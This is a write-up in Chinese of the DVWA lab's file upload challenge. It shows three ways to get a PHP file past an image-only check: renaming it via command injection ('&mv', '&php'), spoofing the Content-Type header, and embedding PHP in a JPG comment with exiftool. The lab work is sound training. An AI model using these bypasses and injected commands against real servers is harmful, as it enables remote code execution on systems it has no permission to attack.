# File Upload

> Objective
> Execute any PHP function of your choosing on the target system (such as [phpinfo()](https://secure.php.net/manual/en/function.phpinfo.php)
> or [system()](https://secure.php.net/manual/en/function.system.php)) thanks to this file upload vulnerability.

### 觀察

試著上傳 *.php 檔案，這次它會檢查副檔名，限定 `jpg` or `png`

```
yo.php
yo.php.php
```

```
Your image was not uploaded. We can only accept JPEG or PNG images.
```

### 更換副檔名上傳後搭配 command injection 執行檔案

那我們就給它 jpg 吧，上傳後再想辦法把副檔名改回來，還好沒有檢查的很嚴格

```
yo.php.jpg
```

```
../../hackable/uploads/yo.php.jpg succesfully uploaded!
```

回到 command injection 的頁面，確認檔案有上傳成功

```
&ls ../../hackable/uploads
```

```
dvwa_email.png
yo.php.jpg
```

接著只要將副檔名從 `jpg` 修改回 `php` 即可

```
&mv ../../hackable/uploads/yo.php.jpg ../../hackable/uploads/yo.php
```

```
&ls ../../hackable/uploads
```

```
dvwa_email.png
yo.php
```

最後直接在這頁執行也可從上傳的資料路徑夾執行我們上傳的檔案

```
&php ../../hackable/uploads/yo.php
```

```
http://localhost:8086/hackable/uploads/yo.php
```

![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/0fa61ad0-ae2d-4654-b092-f881fc3ff75d/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220215%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220215T171113Z&X-Amz-Expires=86400&X-Amz-Signature=00538e46cad98457de7077e0418d9c076893d65406a301c447e278d1f72d8b6e&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/b8b021c5-5525-4870-a47e-4b11d8c74a0f/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220215%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220215T171117Z&X-Amz-Expires=86400&X-Amz-Signature=8191eee2306fd26b8c1bc42ad96f84f37e05f41234d34661c8730c5c75534235&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

---
## Update:

### 修正1: 上傳時更改 Content-Type欺騙檔案型態檢查

之前使用的方法不符合題目義，不應該透過 command injection 改檔名

其實可以直接上傳檔案，騙過後端的檢查，只要使用可以修改 request 的工具即可
```
Your image was not uploaded. We can only accept JPEG or PNG images.
```

修改 Content-Type 再重送一次

```
Content-Type: text/php -> Content-Type: image/jpeg
```
```bash
../../hackable/uploads/demo-upload.jpg.php succesfully uploaded!
```
### 修正 2: executable image

### 使用 `exiftool` 將惡意內容寫入要上傳的圖片，然後再更改檔名上傳即可
```bash
exiftool -Comment="<?php phpinfo(); __halt_compiler(); ?>" demo-upload.jpg.php
```

再利修改 Content-Type 為 `Content-Type: image/jpeg` 的方式通過檔案型態檢查

上傳後直接瀏覽惡意檔案的位置
```
http://dvwa.localtest/hackable/uploads/demo-upload.jpg.php
```

- Injecting executable PHP code to a JPG image file - One Step! Code
[https://onestepcode.com/injecting-php-code-to-jpg/](https://onestepcode.com/injecting-php-code-to-jpg/)
